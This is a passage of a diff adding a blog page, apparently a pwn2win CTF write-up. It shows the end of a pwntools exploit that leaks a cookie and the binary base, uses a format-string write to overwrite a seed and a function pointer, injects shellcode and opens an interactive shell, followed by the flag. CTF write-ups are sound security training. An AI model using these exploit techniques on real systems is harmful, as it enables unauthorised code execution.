+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;Hello, &#34;</span>)
+</span></span><span style="display:flex;"><span>    output <span style="color:#ff7b72;font-weight:bold">=</span> io<span style="color:#ff7b72;font-weight:bold">.</span>recvline()
+</span></span><span style="display:flex;"><span>    cookie <span style="color:#ff7b72;font-weight:bold">=</span> int(output<span style="color:#ff7b72;font-weight:bold">.</span>split(<span style="color:#a5d6ff">&#34;|&#34;</span>)[<span style="color:#a5d6ff">0</span>], <span style="color:#a5d6ff">16</span>)
+</span></span><span style="display:flex;"><span>    elf    <span style="color:#ff7b72;font-weight:bold">=</span> int(output<span style="color:#ff7b72;font-weight:bold">.</span>split(<span style="color:#a5d6ff">&#34;|&#34;</span>)[<span style="color:#a5d6ff">1</span>], <span style="color:#a5d6ff">16</span>) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x1750</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> (cookie, elf)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">exploit</span>():
+</span></span><span style="display:flex;"><span>    io <span style="color:#ff7b72;font-weight:bold">=</span> remote(<span style="color:#a5d6ff">&#34;200.136.252.34&#34;</span>, <span style="color:#a5d6ff">1245</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cookie, elf <span style="color:#ff7b72;font-weight:bold">=</span> leak(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    target <span style="color:#ff7b72;font-weight:bold">=</span> elf <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x5000</span>
+</span></span><span style="display:flex;"><span>    check  <span style="color:#ff7b72;font-weight:bold">=</span> elf <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x4028</span>
+</span></span><span style="display:flex;"><span>    vault  <span style="color:#ff7b72;font-weight:bold">=</span> elf <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x5010</span>
+</span></span><span style="display:flex;"><span>    seed   <span style="color:#ff7b72;font-weight:bold">=</span> elf <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x5008</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;cookie @ </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(cookie)))
+</span></span><span style="display:flex;"><span>    log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;elf    @ </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(elf)))
+</span></span><span style="display:flex;"><span>    log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;target @ </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(target)))
+</span></span><span style="display:flex;"><span>    log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;check  @ </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(check)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    seed_value <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xdcd8</span>
+</span></span><span style="display:flex;"><span>    first_rand_index <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">9</span>
+</span></span><span style="display:flex;"><span>    fptr_value <span style="color:#ff7b72;font-weight:bold">=</span> (vault <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xffff</span>) <span style="color:#ff7b72;font-weight:bold">+</span> first_rand_index<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># homegrown format string library</span>
+</span></span><span style="display:flex;"><span>    fs <span style="color:#ff7b72;font-weight:bold">=</span> FormatString(offset<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">24</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># write in 1 go, will overwrite the entire seed</span>
+</span></span><span style="display:flex;"><span>    fs<span style="color:#ff7b72;font-weight:bold">.</span>write(value<span style="color:#ff7b72;font-weight:bold">=</span>seed_value, step<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">8</span>, addr<span style="color:#ff7b72;font-weight:bold">=</span>seed)
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># write short (hn) will only overwrite 2 bytes</span>
+</span></span><span style="display:flex;"><span>    fs<span style="color:#ff7b72;font-weight:bold">.</span>write(value<span style="color:#ff7b72;font-weight:bold">=</span>fptr_value, step<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">2</span>, addr<span style="color:#ff7b72;font-weight:bold">=</span>target)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff7b72;font-weight:bold">=</span> fs<span style="color:#ff7b72;font-weight:bold">.</span>payload()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic">#overwrite target and seed</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic">#write shellcode to vault</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#a5d6ff">&#34;: &#34;</span>, str(u64(shellcode[<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">8</span>:])))
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#a5d6ff">&#34;: &#34;</span>, <span style="color:#a5d6ff">&#34;+&#34;</span>) <span style="color:#8b949e;font-style:italic"># skip scanf</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#a5d6ff">&#34;: &#34;</span>, <span style="color:#a5d6ff">&#34;+&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#a5d6ff">&#34;: &#34;</span>, str(u64(shellcode[<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">16</span>:<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">8</span>])))
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#a5d6ff">&#34;: &#34;</span>, <span style="color:#a5d6ff">&#34;+&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#a5d6ff">&#34;: &#34;</span>, str(u64(shellcode[:<span style="color:#a5d6ff">8</span>])))
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#a5d6ff">&#34;: &#34;</span>, str(u64(shellcode[<span style="color:#a5d6ff">8</span>:<span style="color:#a5d6ff">16</span>])))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exploit()
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#CTF-BR{_r4nd0m_1nd1c3s_m4ke_th3_ch4ll3nge_m0r3_fun_}</span>
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/pwn2win">pwn2win</a></li>
+					
+					<li><a href="/tags/pwn">pwn</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://example.com" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="BlueSky"><i data-feather="bluesky"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
